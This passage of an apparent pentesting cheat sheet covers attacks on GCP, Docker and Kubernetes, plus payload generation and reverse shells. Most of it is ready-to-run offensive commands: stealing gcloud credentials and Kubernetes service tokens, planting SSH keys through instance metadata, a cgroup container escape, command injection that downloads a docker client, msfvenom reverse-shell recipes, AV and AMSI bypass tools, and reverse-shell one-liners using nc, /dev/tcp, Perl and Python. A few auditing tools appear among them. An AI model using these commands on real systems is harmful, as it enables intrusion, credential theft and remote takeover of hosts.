• Google API allows to mark as accepted
• Bypasses the “don’t auto-add” setting
• Creates urgency w/ reminder notification
• Include link to phishing page

Steal Access Tokens:
• Google JSON Tokens and credentials.db
• JSON tokens typically used for service account access to GCP
• If a user authenticates with gcloud from an instance their creds get stored here:
    ~/.config/gcloud/credentials.db
    sudo find /home -name "credentials.db"
• JSON can be used to authenticate with gcloud and ScoutSuite

Post-compromise
• Cloud Storage, Compute, SQL, Resource manager, IAM
• ScoutSuite from NCC group https://github.com/nccgroup/ScoutSuite
• Tool for auditing multiple different cloud security providers
• Create Google JSON token to auth as service account
</code></pre>
<h2 id="enumeration"><a class="header" href="#enumeration">Enumeration</a></h2>
<pre><code># Authentication with gcloud and retrieve info
gcloud auth login
gcloud auth activate-service-account --key-file creds.json
gcloud auth activate-service-account --project=&lt;projectid&gt; --key-file=filename.json
gcloud auth list
gcloud init
gcloud config configurations activate stolenkeys
gcloud config list
gcloud organizations list
gcloud organizations get-iam-policy &lt;org ID&gt;
gcloud projects get-iam-policy &lt;project ID&gt;
gcloud iam roles list  --project=&lt;project ID&gt;
gcloud beta asset search-all-iam-policies --query policy:"projects/xxxxxxxx/roles/CustomRole436" --project=xxxxxxxx
gcloud projects list
gcloud config set project &lt;project name&gt;
gcloud services list
gcloud projects list
gcloud config set project [Project-Id]
gcloud source repos list
gcloud source repos clone &lt;repo_name&gt;

# Virtual Machines
gcloud compute instances list
gcloud compute instances list --impersonate-service-account AccountName
gcloud compute instances list --configuration=stolenkeys
gcloud compute instances describe &lt;instance id&gt;
gcloud compute instances describe &lt;InstanceName&gt; --zone=ZoneName --format=json | jq -c '.serviceAccounts[].scopes[]'
gcloud beta compute ssh --zone "&lt;region&gt;" "&lt;instance name&gt;" --project "&lt;project name&gt;"
# Puts public ssh key onto metadata service for project
gcloud compute ssh &lt;local host&gt;
curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes -H &amp;#39;Metadata-Flavor:Google’
# Use Google keyring to decrypt encrypted data
gcloud kms decrypt --ciphertext-file=encrypted-file.enc --plaintext-file=out.txt --key &lt;crypto-key&gt; --keyring &lt;crypto-keyring&gt; --location global

# Storage Buckets
List Google Storage buckets
gsutil ls
gsutil ls -r gs://&lt;bucket name&gt;
gsutil cat gs://bucket-name/anyobject
gsutil cp gs://bucketid/item ~/

# Webapps &amp; SQL
gcloud app instances list
gcloud sql instances list
gcloud spanner instances list
gcloud bigtable instances list
gcloud sql databases list --instance &lt;instance ID&gt;
gcloud spanner databases list --instance &lt;instance name&gt;

# Export SQL databases and buckets
# First copy buckets to local directory
gsutil cp gs://bucket-name/folder/ .
# Create a new storage bucket, change perms, export SQL DB
gsutil mb gs://&lt;googlestoragename&gt;
gsutil acl ch -u &lt;service account&gt; gs://&lt;googlestoragename&gt;
gcloud sql export sql &lt;sql instance name&gt; gs://&lt;googlestoragename&gt;/sqldump.gz --database=&lt;database name&gt;

# Networking
gcloud compute networks list
gcloud compute networks subnets list
gcloud compute vpn-tunnels list
gcloud compute interconnects list
gcloud compute firewall-rules list
gcloud compute firewall-rules describe &lt;rulename&gt;

# Containers
gcloud container clusters list
# GCP Kubernetes config file ~/.kube/config gets generated when you are authenticated with
gcloud container clusters get-credentials &lt;cluster name&gt; --region &lt;region&gt;
kubectl cluster-info

# Serverless (Lambda functions)
gcloud functions list
gcloud functions describe &lt;function name&gt;
gcloud functions logs read &lt;function name&gt; --limit &lt;number of lines&gt;
# Gcloud stores creds in ~/.config/gcloud/credentials.db Search home directories
sudo find /home -name "credentials.db
# Copy gcloud dir to your own home directory to auth as the compromised user
sudo cp -r /home/username/.config/gcloud ~/.config
sudo chown -R currentuser:currentuser ~/.config/gcloud
gcloud auth list

# Databases
gcloud sql databases list
gcloud sql backups list --instance=test

# Metadata Service URL
# metadata.google.internal = 169.254.169.254
curl "http://metadata.google.internal/computeMetadata/v1/?recursive=true&amp;alt=text" -H
"Metadata-Flavor: Google"

# Interesting metadata instance urls:
http://169.254.169.254/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/
http://metadata/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/hostname
http://metadata.google.internal/computeMetadata/v1/instance/id
http://metadata.google.internal/computeMetadata/v1/project/project-id

# Get access scope
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes -H 'Metadata-Flavor:Google'

# Get snapshot from instance and create instance from it
gcloud compute snapshots list
gcloud compute instances create instance-2 --source-snapshot=snapshot-1 --zone=us-central1-a
</code></pre>
<h2 id="attacks-3"><a class="header" href="#attacks-3">Attacks</a></h2>
<pre><code># Check ssh keys attached to instance
gcloud compute instances describe instance-1 --zone=us-central1-a --format=json | jq '.metadata.items[].value'
# Check for "privilegeduser:ssh-rsa" and generate ssh keys with same username and paste in file
ssh-keygen -t rsa -C "privilegeduser" -f ./underprivuser 
# Something like:
privilegeduser:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDFGrK8V2k0xBeSzN+oUgnRLSIgUED7ayeUJJ10ryEFR0xJbFeGsRAL5LUzw1DTT9gRKmcMTjmZNU3E99bwyytV0fLnGVRIZ63oC8IdTESR0g8EnU6yam/ntq6gZF5QRcES3gaZlnssOQQhw0rvcCB7o5oM1zCDQtgJXAu/2UI6yKf3xdlcHdrULbKTR+0c7r2FWMLgdghGsA+yH3leHJWjDE/WJ1mqf+ZE+RvwLZ8TmVFJmI37xoKEeVnkmOrOe/TMYvtuzSQduHEUhhfjB8YPUYH7dGHyVPlRp/0Hsrjauf5//zNN9dyAZisElgF7CnJmtJVizfDxlXd/nwrVC8nf2xzbi8nc24STfTg3+lR1f73Z5xN9waPl3eHMNy7nXvShxSO01ZwwuyTmjNh83ik1PJjNU= privilegeduser
privilegeduser:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDnLriKvJcwZ2eRUbYpy7ZiZrZub+ZblHgKhATPnRjEXK7Q5U3vOFutCeMavxQ82yIwne6b6LzDAfKeS6wlez1ll2npGhKpb8mAM+ZIKxdTAoAhenOlLlmMyYHhJs/UjkTtj7TZDIEa/uZjZgClK5fmgkYjprsRbPOtAru8fBAOAWfMtrXYFmUJy94iMIvYpRuUPTZ0XUkzmyETNspZOwoOd+K2yTmFor4mWIgTzbaeAtJA+b+nQmXM1Ya1RfalpQsomXnkhqihh/wmqJMDGIJT1YgepMxbj4wy5WyUlE4Ub+/Wh7Lyu51jaRJ++FYh/pgb3m3d8t7B6b2Jj7ldxicQSPu6Mc9TZ5QrPx91dOe/Mzmte2kW7AF8xXo+Se71Ffc5csupUo62uyeXt12F+qNiqHeJXSomxck7rRwonnUhyNJ2icCPogsbDNDjHvdXmGsrXNFU= privilegeduser
# Upload the file with the 2 keys and access to the instance
gcloud compute instances add-metadata instance-1 --metadata-from-file ssh-keys=keys.txt --zone us-central1-a
ssh -i underprivuser privilegeduser@xx.xx.xx.xx

# Re-authentication the account keys
# Find keys in instance
cd /home/&lt;username&gt;/.config/gcloud
cat credentials.db
# Copy the credentials, make a new json file inside your computer and paste it.
gcloud auth activate-service-account --key-file &lt;file&gt;.json
# Now can access API
</code></pre>
<h2 id="tools-32"><a class="header" href="#tools-32">Tools</a></h2>
<h1 id="httpsgithubcomprowler-cloudprowler"><a class="header" href="#httpsgithubcomprowler-cloudprowler">https://github.com/prowler-cloud/prowler</a></h1>
<p>prowler gcp</p>
<h1 id="check-for-the-most-important-checks-in-terms-of-severity"><a class="header" href="#check-for-the-most-important-checks-in-terms-of-severity">check for the most important checks in terms of severity</a></h1>
<p>prowler gcp --severity critical high</p>
<pre><code></code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="docker--kubernetes"><a class="header" href="#docker--kubernetes">Docker &amp;&amp; Kubernetes</a></h1>
<h2 id="docker"><a class="header" href="#docker">Docker</a></h2>
<h3 id="concepts"><a class="header" href="#concepts"><strong>Concepts</strong></a></h3>
<ul>
<li>Docker Image
<ul>
<li>Read only file with OS, libraries and apps</li>
<li>Anyone can create a docker image</li>
<li>Images can be stored in Docker hub (default public registry) or private registry</li>
</ul>
</li>
<li>Docker Container
<ul>
<li>Stateful instance of an image with a writable layer</li>
<li>Contains everything needed to run your application</li>
<li>Based on one or more images</li>
</ul>
</li>
<li>Docker Registry
<ul>
<li>Repository of images</li>
</ul>
</li>
<li>Docker Hub
<ul>
<li>Public docker registry</li>
</ul>
</li>
<li>Dockerfile
<ul>
<li>Configuration file that contains instructions for building a Docker image</li>
</ul>
</li>
<li>Docker-compose file
<ul>
<li>Configuration file for docker-compose</li>
</ul>
</li>
<li>Docker Swarm
<ul>
<li>Group of machines that are running Docker and joined into a cluster.</li>
<li>When you run docker commands, they are executed by a swarm manager.</li>
</ul>
</li>
<li>Portainer
<ul>
<li>Management solution for Docker hosts and Docker Swarm clusters</li>
<li>Via web interface</li>
</ul>
</li>
<li>Docker capabilities
<ul>
<li>Turn the binary "root/non-root" into a fine-grained access control system.</li>
<li>Processes that just need to bind on a port below 1024 do not have to run as root, they can just be granted the net_bind_service capability instead.</li>
</ul>
</li>
<li>Docker Control Groups
<ul>
<li>Used to allocate cpu, memory, network bandwith of host to container groups.</li>
</ul>
</li>
</ul>
<h3 id="commands"><a class="header" href="#commands"><strong>Commands</strong></a></h3>
<pre><code># Search in docker hub
docker search wpscan
# Run docker container from docker hub
docker run ubuntu:latest echo "Welcome to Ubuntu"
# Run docker container from docker hub with interactive tty
docker run --name samplecontainer -it ubuntu:latest /bin/bash
# List running containers
docker ps
# List all containers
docker ps -a
# List docker images
docker images
# Run docker in background
docker run --name pingcontainer -d alpine:latest ping 127.0.0.1 -c 50
# Get container logs
docker logs -f pingcontainer
# Run container service in specified port
docker run -d --name nginxalpine -p 7777:80 nginx:alpine
# Access tty of running container
docker exec -it nginxalpine sh
# Get low-level info of docker object
docker inspect (container or image)
# Show image history
docker history jess/htop
# Stop container
docker stop dummynginx
# Remove container
docker rm dummynginx
# Run docker with specified PID namespace
docker run --rm -it --pid=host jess/htop

# Show logs
docker logs containername
docker logs -f containername
# Show service defined logs
docker service logs
# Look generated real time events by docker runtime
docker system events
docker events --since '10m'
docker events --filter 'image=alpine'
docker events --filter 'event=stop'

# Compose application (set up multicontainer docker app)
docker-compose up -d
# List docker volumes
docker volume ls
# Create volume
docker volume create vol1
# List docker networks
docker network ls
# Create docker network
docker network create net1
# Remove captability of container
docker run --rm -it --cap-drop=NET_RAW alpine sh
# Check capabilities inside container
docker run --rm -it 71aa5f3f90dc bash
capsh --print
# Run full privileged container
docker run --rm -it --privileged=true 71aa5f3f90dc bash
capsh --print
# From full privileged container you can access host devices
more /dev/kmsg

# Creating container groups
docker run -d --name='low_priority' --cpuset-cpus=0 --cpu-shares=10 alpine md5sum /dev/urandom
docker run -d --name='high_priority' --cpuset-cpus=0 --cpu-shares=50 alpine md5sum /dev/urandom
# Stopping cgroups
docker stop low_priority high_priority
# Remove cgroups
docker rm low_priority high_priority

# Setup docker swarm cluster
docker swarm init
# Check swarm nodes
docker node ls
# Start new service in cluster
docker service create --replicas 1 --publish 5555:80 --name nginxservice
nginx:alpine
# List services
docker service ls
# Inspect service
docker service inspect --pretty nginxservice
# Remove service
docker service rm nginxservice
# Leave cluster
docker swarm leave (--force if only one node)

# Start portainer
docker run -d -p 9000:9000 --name portainer \
--restart always -v /var/run/docker.sock:/var/run/docker.sock \
-v /opt/portainer:/data portainer/portainer


# Tools
# https://github.com/lightspin-tech/red-kube
</code></pre>
<h3 id="docker-security-basics"><a class="header" href="#docker-security-basics">Docker security basics</a></h3>
<pre><code># Get image checksum
docker images --digests ubuntu
# Check content trust to get signatures
docker trust inspect mediawiki --pretty
# Check vulns in container
- Look vulns in base image
- Use https://vulners.com/audit to check for docker packages
- Inside any container
cat /etc/issue
dpkg-query -W -f='${Package} ${Version} ${Architecture}\n'
- Using Trivy https://github.com/aquasecurity/trivy
trivy image knqyf263/vuln-image:1.2.3
# Check metadata, secrets, env variables
docker inspect &lt;image name&gt;
docker inspect &lt;container name&gt;
# Review image history
docker history image:latest
# Inspect everything
docker volume inspect wordpress_db_data
docker network inspect wordpress_default
# Interesting look in the volume mountpoints
docker volume inspect whatever
cd /var/lib/docker/volumes/whatever
# Integrity check for changed files
docker diff imagename
# Check if you're under a container
https://github.com/genuinetools/amicontained#usage
# Docker Bench Security (Security Auditor)
cd /opt/docker-bench-security
sudo bash docker-bench-security.sh
</code></pre>
<h3 id="detect-inside-a-docker-or-running-containers"><a class="header" href="#detect-inside-a-docker-or-running-containers">Detect inside a docker or running containers</a></h3>
<pre><code>- MAC Address
    - Docker uses a range from 02:42:ac:11:00:00 to 02:42:ac:11:ff:ff
- List of running processes (ps aux)
    - Small number of processes generally indicate a container
- CGROUPs
    - cat /proc/1/cgroup – should show docker process running
- Check for existence of docker.sock (ls -al /var/run/docker.sock)
- Check for container capabilities: capsh –print
- On Pentests, check for tcp ports 2375 and 2376 – Default docker daemon ports
</code></pre>
<h3 id="escape-net_admin-docker-container"><a class="header" href="#escape-net_admin-docker-container">Escape NET_ADMIN docker container</a></h3>
<pre><code># Check if you're NET_ADMIN
ip link add dummy0 type dummy
ip link delete dummy0
# If it works, this script execute 'ps aux' in host:
mkdir /tmp/cgrp &amp;&amp; mount -t cgroup -o rdma cgroup /tmp/cgrp &amp;&amp; mkdir /tmp/cgrp/xecho 1 &gt; /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" &gt; /tmp/cgrp/release_agentecho '#!/bin/sh' &gt; /cmd
echo "ps aux &gt; $host_path/output" &gt;&gt; /cmd
chmod a+x /cmdsh -c "echo \$\$ &gt; /tmp/cgrp/x/cgroup.procs"
# You can replace the 'ps aux' command for:
cat id_dsa.pub &gt;&gt; /root/.ssh/authorized_keys
</code></pre>
<h3 id="attack-insecure-volume-mounts"><a class="header" href="#attack-insecure-volume-mounts">Attack insecure volume mounts</a></h3>
<pre><code># After get reverse shell in docker container (eg insecure webapp with RCE)
# This commands are executed inside insecure docker container
# Check if it's available docker.sock
ls -l /var/run/docker.sock
# This allows to access the host docker service using host option with docker client by using the UNIX socket
# Now download docker client in container and run commands in host
./docker -H unix:///var/run/docker.sock ps
./docker -H unix:///var/run/docker.sock images
</code></pre>
<h3 id="attack-docker-misconfiguration"><a class="header" href="#attack-docker-misconfiguration">Attack docker misconfiguration</a></h3>
<pre><code># Docker container with exposed ports running docker service
# Docker API is exposed in those docker ports
# Check query docker API with curl
curl 10.11.1.111:2375/images/json | jq .
# Then you can run commands in host machine
docker -H tcp://10.11.1.111:2375 ps
docker -H tcp://10.11.1.111:2375 images
</code></pre>
<h3 id="audit-docker-runtime-and-registries"><a class="header" href="#audit-docker-runtime-and-registries">Audit Docker Runtime and Registries</a></h3>
<pre><code># Runtime

# Host with multiple dockers running
# Check docker daemon
docker system info
# Check docker API exposed on 0.0.0.0
cat /lib/systemd/system/docker.service
# Check if docker socket is running in any container
docker inspect | grep -i '/var/run/'
# Check rest of files docker related
ls -l /var/lib/docker/
# Check for any secret folder
ls -l /var/run/
ls -l /run/

# Public Registries
# Docker registry is a distribution system for Docker images. There will be diferent images and each may contain multiple tags and versions. By default the registry runs on port 5000 without authentication and TLS
# Check if docker registry is up and running
curl -s http://localhost:5000/v2/_catalog | jq .
# Get tags of docker image
curl -s http://localhost:5000/v2/devcode/tags/list | jq .
# Download image locally
docker pull localhost:5000/devcode:latest
# Access container to review it
docker run --rm -it localhost:5000/devcode:latest sh
# Once mounted we can check the docker daemon config to see user and registry
docker system info
# And we can check the registries configured for the creds
cat ~/.docker/config.json

# Private registries
# Check catalog
curl 10.11.1.111:5000/v2/_catalog
# Get image tags
curl 10.11.1.111:5000/v2/privatecode/tags/list
# Add the insecure-registry tag to download docker image
vi /lib/systemd/system/docker.service
ExecStart=/usr/bin/dockerd -H fd:// --insecure-registry 10.11.1.111:5000
# Restart docker service
sudo systemctl daemon-reload
sudo service docker restart
# Download the image
docker pull 10.11.1.111:5000/privatecode:whatevertag
# Enter inside container and enumerate
docker run --rm -it 10.11.1.111:5000/privatecode:golang-developer-team sh
cd /app
ls -la
</code></pre>
<h3 id="attack-container-capabilities"><a class="header" href="#attack-container-capabilities">Attack container capabilities</a></h3>
<pre><code># Host with sys_ptrace capability enabled with host PID space. So it runs top command of host
# You're already inside container
# Check capabilities
capsh --print
# Upload reverse shell and linux-injector
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f raw -o payload.bin
# Check any process running as root
ps aux | grep root
./injector PID_RUNNING_AS_ROOT payload.bin
</code></pre>
<h3 id="tools-33"><a class="header" href="#tools-33">Tools</a></h3>
<pre><code># https://github.com/anchore/grype
# https://github.com/aquasecurity/trivy
# https://github.com/cr0hn/dockerscan
# https://github.com/P3GLEG/Whaler
# https://github.com/RhinoSecurityLabs/ccat
https://github.com/stealthcopter/deepce
https://github.com/anchore/grype
</code></pre>
<h2 id="kubernetes"><a class="header" href="#kubernetes">Kubernetes</a></h2>
<p>https://blog.appsecco.com/a-pentesters-approach-to-kubernetes-security-part-1-2b328252954a</p>
<p>https://blog.appsecco.com/a-pentesters-approach-to-kubernetes-security-part-2-8efac412fbc5</p>
<h3 id="concepts-1"><a class="header" href="#concepts-1"><strong>Concepts</strong></a></h3>
<ul>
<li>Kubernetes is a security orchestrator</li>
<li>Kubernetes master provides an API to interact with nodes</li>
<li>Each Kubernetes node run kubelet to interact with API and kube-proxy to refect Kubernetes networking services on each node.</li>
<li>Kubernetes objects are abstractions of states of your system.
<ul>
<li>Pods: collection of container share a network and namespace in the same node.</li>
<li>Services: Group of pods running in the cluster.</li>
<li>Volumes: directory accesible to all containers in a pod. Solves the problem of loose info when container crash and restart.</li>
<li>Namespaces: scope of Kubernetes objects, like a workspace (dev-space).</li>
</ul>
</li>
</ul>
<h3 id="commands-1"><a class="header" href="#commands-1"><strong>Commands</strong></a></h3>
<pre><code># kubectl cli for run commands against Kubernetes clusters
# Get info
kubectl cluster-info
# Get other objects info
kubectl get nodes
kubectl get pods
kubectl get services
# Deploy
kubectl run nginxdeployment --image=nginx:alpine
# Port forward to local machine
kubectl port-forward &lt;PODNAME&gt; 1234:80
# Deleting things
kubectl delete pod
# Shell in pod
kubectl exec -it &lt;PODNAME&gt; sh
# Check pod log
kubectl logs &lt;PODNAME&gt;
# List API resources
kubectl api-resources
# Check permissions
kubectl auth can-i create pods
# Get secrets
kubectl get secrets &lt;SECRETNAME&gt; -o yaml
# Get more info of specific pod
kubectl describe pod &lt;PODNAME&gt;
# Get cluster info
kubectl cluster-info dump

# Known vulns
CVE-2016-9962
CVE-2018-1002105
CVE-2019-5736
CVE-2019-9901
</code></pre>
<h3 id="external-recon"><a class="header" href="#external-recon">External Recon</a></h3>
<pre><code class="language-bash"># Find subdomains like k8s.target.tld
# Search for yaml files on GitHub
# Check etcdtcl exposed public 
etcdctl –endpoints=http://&lt;MASTER-IP&gt;:2379 get / –prefix –keys-only
# Check pods info disclosure on http://&lt;external-IP&gt;:10255/pods
</code></pre>
<h4 id="common-open-ports"><a class="header" href="#common-open-ports">Common open ports</a></h4>
<p><img src="enumeration/cloud/../../.gitbook/assets/image%20(40).png" alt="" /></p>
<h4 id="common-endpoints"><a class="header" href="#common-endpoints">Common endpoints</a></h4>
<p><img src="enumeration/cloud/../../.gitbook/assets/image%20(25).png" alt="" /></p>
<h3 id="quick-attacks-1"><a class="header" href="#quick-attacks-1">Quick attacks</a></h3>
<pre><code class="language-bash"># Dump all
for res in $(kubectl api-resources -o name);do kubectl get "${res}" -A -o yaml &gt; ${res}.yaml; done

# Check for anon access
curl -k https://&lt;master_ip&gt;:&lt;port&gt;
etcdctl –endpoints=http://&lt;MASTER-IP&gt;:2379 get / –prefix –keys-only
curl http://&lt;external-IP&gt;:10255/pods

#Dump tokens from inside the pod
kubectl exec -ti &lt;pod&gt; -n &lt;namespace&gt; cat /run/secrets/kubernetes.io/serviceaccount/token

#Dump all tokens from secrets
kubectl get secrets -A -o yaml | grep " token:" | sort | uniq &gt; alltokens.txt

#Standard query for creds dump:
curl -v -H "Authorization: Bearer &lt;jwt_token&gt;" https://&lt;master_ip&gt;:&lt;port&gt;/api/v1/namespaces/&lt;namespace&gt;/secrets/
# This also could works /api/v1/namespaces/kube-system/secrets/
</code></pre>
<h3 id="attack-private-registry-misconfiguration"><a class="header" href="#attack-private-registry-misconfiguration">Attack Private Registry misconfiguration</a></h3>
<pre><code class="language-bash"># Web application deployed vulnerable to lfi
# Read configuration through LFI
cat /root/.docker/config.json
# Download this file to your host and configure in your system
docker login -u _json_key -p "$(cat config.json)" https://gcr.io
# Pull the private registry image to get the backend source code
docker pull gcr.io/training-automation-stuff/backend-source-code:latest
# Inspect and enumerate the image
docker run --rm -it gcr.io/training-automation-stuff/backend-source-code:latest
# Check for secrets inside container
ls -l /var/run/secrets/kubernetes.io/serviceaccount/
# Check environment vars
printenv
</code></pre>
<h3 id="attack-cluster-metadata-with-ssrf"><a class="header" href="#attack-cluster-metadata-with-ssrf">Attack Cluster Metadata with SSRF</a></h3>
<pre><code class="language-bash"># Webapp that check the health of other web applications
# Request to 
curl http://169.254.169.254/computeMetadata/v1/
curl http://169.254.169.254/computeMetadata/v1/instance/attributes/kube-env
</code></pre>
<h3 id="attack-escaping-pod-volume-mounts-to-access-node-and-host"><a class="header" href="#attack-escaping-pod-volume-mounts-to-access-node-and-host">Attack escaping pod volume mounts to access node and host</a></h3>
<pre><code class="language-bash"># Webapp makes ping
# add some listing to find docker.sock
ping whatever;ls -l /custom/docker/
# Once found, download docker client
ping whatever;wget https://download.docker.com/linux/static/stable/x86_64/docker-18.09.1.tgz -O /root/docker-18.09.1.tgz
ping whatever;tar -xvzf /root/docker-18.09.1.tgz -C /root/
ping whatever;/root/docker/docker -H unix:///custom/docker/docker.sock ps
ping whatever;/root/docker/docker -H unix:///custom/docker/docker.sock images
</code></pre>
<h3 id="tools-34"><a class="header" href="#tools-34">Tools</a></h3>
<pre><code class="language-bash"># kube-bench - secutity checker
kubectl apply -f kube-bench-node.yaml
kubectl get pods --selector job-name=kube-bench-node
kubectl logs kube-bench-podname

# https://github.com/aquasecurity/kube-hunter
kube-hunter --remote some.node.com

# kubeaudit
./kubeaudit all

# kubeletctl
# https://github.com/cyberark/kubeletctl
kubeletctl scan rce XXXXXXXX

# https://github.com/cdk-team/CDK
cdk evaluate

# Api audit
# https://github.com/averonesis/kubolt

# PurplePanda https://github.com/carlospolop/PurplePanda
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="cdn---comain-fronting"><a class="header" href="#cdn---comain-fronting">CDN - Comain Fronting</a></h1>
<pre><code class="language-text">CDN - Domain Fronting

**Tools**
https://github.com/rvrsh3ll/FindFrontableDomains 
https://github.com/stevecoward/domain-fronting-tools
# Domain Fronting TLS 1.3
https://github.com/SixGenInc/Noctilucent
https://github.com/vysecurity/DomainFrontingLists
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="payloads-1"><a class="header" href="#payloads-1">Payloads</a></h1>
<h2 id="msfvenom"><a class="header" href="#msfvenom">msfvenom</a></h2>
<pre><code class="language-text"># Creating a payload
msfvenom -p [payload] LHOST=[listeninghost] LPORT=[listeningport]

# List of payloads
msfvenom -l payloads

# Payload options
msfvenom -p windows/x64/meterpreter_reverse_tcp --list-options

# Creating a payload with encoding
msfvenom -p [payload] -e [encoder] -f [formattype] -i [iteration]  &gt; outputfile

# Creating a payload using a template
msfvenom -p [payload]  -x [template] -f [formattype] &gt; outputfile

# Listener for MSfvenom Payloads:
msf5&gt;use exploit/multi/handler  
msf5&gt;set payload windows/meterpreter/reverse_tcp  
msf5&gt;set lhost   
msf5&gt;set lport   
msf5&gt; set ExitOnSession false  
msf5&gt;exploit -j  

#  Windows Payloads
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe &gt; shell.exe    
msfvenom -p windows/meterpreter_reverse_http LHOST=IP LPORT=PORT HttpUserAgent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" -f exe &gt; shell.exe    
msfvenom -p windows/meterpreter/bind_tcp RHOST= IP LPORT=PORT -f exe &gt; shell.exe    
msfvenom -p windows/shell/reverse_tcp LHOST=IP LPORT=PORT -f exe &gt; shell.exe    
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe &gt; shell.exe

#  Linux Payloads
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f elf &gt; shell.elf    
msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=IP LPORT=PORT -f elf &gt; shell.elf    
msfvenom -p linux/x64/shell_bind_tcp RHOST=IP LPORT=PORT -f elf &gt; shell.elf    
msfvenom -p linux/x64/shell_reverse_tcp RHOST=IP LPORT=PORT -f elf &gt; shell.elf

# Add a user in windows with msfvenom: 
msfvenom -p windows/adduser USER=hacker PASS=password -f exe &gt; useradd.exe

#  Web Payloads

# PHP
msfvenom -p php/meterpreter_reverse_tcp LHOST= LPORT= -f raw &gt; shell.php
cat shell.php | pbcopy &amp;&amp; echo ' shell.php &amp;&amp; pbpaste &gt;&gt; shell.php

# ASP
msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f asp &gt; shell.asp

# JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f raw &gt; shell.jsp

# WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f war &gt; shell.war

#  Scripting Payloads

# Python
msfvenom -p cmd/unix/reverse_python LHOST= LPORT= -f raw &gt; shell.py

# Bash
msfvenom -p cmd/unix/reverse_bash LHOST= LPORT= -f raw &gt; shell.sh

# Perl
msfvenom -p cmd/unix/reverse_perl LHOST= LPORT= -f raw &gt; shell.pl

# Creating an Msfvenom Payload with an encoder while removing bad charecters:
msfvenom -p windows/shell_reverse_tcp EXITFUNC=process LHOST=IP LPORT=PORT -f c -e x86/shikata_ga_nai -b "\x0A\x0D"

https://hacker.house/lab/windows-defender-bypassing-for-meterpreter/
</code></pre>
<h2 id="bypass-av"><a class="header" href="#bypass-av">Bypass AV</a></h2>
<pre><code class="language-text"># Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless: 
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload: 
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut: 
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
</code></pre>
<h2 id="bypass-amsi"><a class="header" href="#bypass-amsi">Bypass Amsi</a></h2>
<pre><code class="language-text"># Testing for Amsi Bypass:
https://github.com/rasta-mouse/AmsiScanBufferBypass

# Amsi-Bypass-Powershell
https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell

https://blog.f-secure.com/hunting-for-amsi-bypasses/
https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/
https://github.com/cobbr/PSAmsi/wiki/Conducting-AMSI-Scans
https://slaeryan.github.io/posts/falcon-zero-alpha.html
</code></pre>
<h2 id="office-docs"><a class="header" href="#office-docs">Office Docs</a></h2>
<pre><code class="language-text">https://github.com/thelinuxchoice/eviloffice
https://github.com/thelinuxchoice/evilpdf
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="reverse-shells"><a class="header" href="#reverse-shells">Reverse Shells</a></h1>
<h2 id="tools-35"><a class="header" href="#tools-35">Tools</a></h2>
<pre><code class="language-text">**Tools** 
https://github.com/ShutdownRepo/shellerator
https://github.com/0x00-0x00/ShellPop
https://github.com/cybervaca/ShellReverse
https://liftoff.github.io/pyminifier/
https://github.com/xct/xc/
https://weibell.github.io/reverse-shell-generator/
https://github.com/phra/PEzor
</code></pre>
<h2 id="linux"><a class="header" href="#linux">Linux</a></h2>
<pre><code class="language-text"># Bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 172.21.0.0 1234 &gt;/tmp/f
nc -e /bin/sh 10.11.1.111 4443
bash -i &gt;&amp; /dev/tcp/IP ADDRESS/8080 0&gt;&amp;1

# Bash B64 Ofuscated
{echo,COMMAND_BASE64}|{base64,-d}|bash 
echo${IFS}COMMAND_BASE64|base64${IFS}-d|bash
bash -c {echo,COMMAND_BASE64}|{base64,-d}|{bash,-i} 
echo COMMAND_BASE64 | base64 -d | bash 

# Perl
perl -e 'use Socket;$i="IP ADDRESS";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'

# Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP ADDRESS",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
